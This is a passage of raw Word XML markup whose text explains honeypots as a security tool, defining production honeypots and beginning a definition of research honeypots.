          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>v</w:t>
      </w:r>
      <w:r>
        <w:t>el of</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nvo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>v</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>B</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:t>sed</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>on</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>dep</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>oy</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>honeypo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>ay</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>be c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>ass</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ed</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>as:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>produc</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:t>on</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>honeypo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>and research honeyp</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>s.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="5" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:left="100" w:right="70" w:firstLine="710"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>P</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-6"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>oduct</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>on</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>honeypots</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>are easy</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:t>se,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>cap</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ure</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>on</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>y</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>mi</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ed</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nfor</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:t>on,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>and</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>are used pr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>im</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>il</w:t>
      </w:r>
      <w:r>
        <w:t>y</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>by co</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:t>an</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>es</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>or corpor</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:t>ons.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>Produc</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:t>on</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>honeypo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>are</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>aced</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ns</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>de</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>produ</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:t>on ne</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>work</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>w</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:t>h o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>her</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>produ</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:t>on</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>servers</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>by</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">an </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-6"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:t>gan</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>za</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:t>on</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>im</w:t>
      </w:r>
      <w:r>
        <w:t>pro</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>v</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>overa</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>of</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>secur</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-16"/>
        </w:rPr>
        <w:t>y</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>N</w:t>
      </w:r>
      <w:r>
        <w:t>or</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ll</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-16"/>
        </w:rPr>
        <w:t>y</w:t>
      </w:r>
      <w:r>
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="6"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>produc</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:t>on</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="6"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>honeypo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="5"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>are</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="6"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>ow-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>era</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:t>on</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="6"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>honeypo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>s,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="5"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>wh</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ch</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="5"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>are</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="6"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>eas</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>er</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="5"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="6"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>dep</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-16"/>
        </w:rPr>
        <w:t>y</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:t>hey g</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ve </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ess </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nfor</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:t>on</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>about</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:t>e a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>acks or a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ackers </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:t>an research</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>honeypo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>s.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="5" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100" w:right="66" w:firstLine="710"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Resea</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-5"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ch</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>honeypo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">s   </w:t>
      </w:r>
      <w:r>
        <w:t>ga</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:t>er</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nfor</w:t>
      </w:r>
      <w:r>
        <w:rPr>
